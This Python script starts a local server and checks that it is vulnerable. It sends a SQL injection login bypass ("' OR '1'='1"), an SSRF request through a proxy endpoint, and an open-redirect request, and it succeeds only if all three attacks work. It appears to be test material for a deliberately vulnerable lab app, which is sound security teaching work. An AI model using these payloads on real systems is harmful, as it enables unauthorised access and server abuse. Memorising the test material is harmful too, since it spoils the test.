import subprocess
import time
import urllib.request
import urllib.parse
import sys
import os

SERVER_PORT = 8000
SERVER_URL = f"http://localhost:{SERVER_PORT}"

def run_server():
    # Start the server as a subprocess, suppress output to keep verify output clean
    process = subprocess.Popen(["python3", "server.py"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    return process

def test_sql_injection():
    print("Testing SQL Injection on /login...")
    try:
        payload = "' OR '1'='1"
        params = urllib.parse.urlencode({'username': payload})
        url = f"{SERVER_URL}/login?{params}"
        with urllib.request.urlopen(url) as response:
            content = response.read().decode('utf-8')
            if response.status == 200 and "Login Successful" in content:
                print("SQL Injection SUCCESS")
                return True
            else:
                print(f"SQL Injection FAILED (Status: {response.status}, Body: {content})")
                return False
    except urllib.error.HTTPError as e:
        print(f"SQL Injection FAILED (HTTPError: {e.code})")
        return False
    except Exception as e:
        print(f"SQL Injection ERROR: {e}")
        return False

def test_ssrf():
    print("Testing SSRF on /proxy...")
    try:
        target_url = "http://example.com"
        params = urllib.parse.urlencode({'url': target_url})
        url = f"{SERVER_URL}/proxy?{params}"
        with urllib.request.urlopen(url) as response:
            content = response.read().decode('utf-8')
            if response.status == 200 and "Example Domain" in content:
                print("SSRF SUCCESS")
                return True
            else:
                print(f"SSRF FAILED (Status: {response.status})")
                return False
    except Exception as e:
        print(f"SSRF ERROR: {e}")
        return False

def test_open_redirect():
    print("Testing Open Redirect on /redirect...")
    # Create a custom opener that doesn't follow redirects
    class NoRedirect(urllib.request.HTTPRedirectHandler):
        def redirect_request(self, req, fp, code, msg, headers, newurl):
            return None

    opener = urllib.request.build_opener(NoRedirect)
    # Don't install globally, use opener.open()

    try:
        target_url = "http://example.com"
        params = urllib.parse.urlencode({'url': target_url})
        url = f"{SERVER_URL}/redirect?{params}"
        try:
            response = opener.open(url)
            # If we get here without exception, it means no redirect or 200 OK
            print(f"Open Redirect FAILED (Expected 302, got {response.status})")
            return False
        except urllib.error.HTTPError as e:
            if e.code == 302:
                location = e.headers.get('Location')
                if location == target_url:
                    print("Open Redirect SUCCESS")
                    return True
                else:
                    print(f"Open Redirect FAILED (Location mismatch: {location})")
                    return False
            else:
                print(f"Open Redirect FAILED (HTTPError: {e.code})")
                return False
    except Exception as e:
        print(f"Open Redirect ERROR: {e}")
        return False

def main():
    server_process = run_server()
    time.sleep(2) # Wait for server to start

    try:
        sqli_result = test_sql_injection()
        ssrf_result = test_ssrf()
        redirect_result = test_open_redirect()

        if sqli_result and ssrf_result and redirect_result:
            print("\nAll vulnerabilities verified successfully!")
            server_process.terminate()
            sys.exit(0)
        else:
            print("\nSome verifications failed.")
            server_process.terminate()
            sys.exit(1)

    except KeyboardInterrupt:
        server_process.terminate()
        sys.exit(1)
    except Exception as e:
        print(f"Unexpected error: {e}")
        server_process.terminate()
        sys.exit(1)

if __name__ == "__main__":
    main()
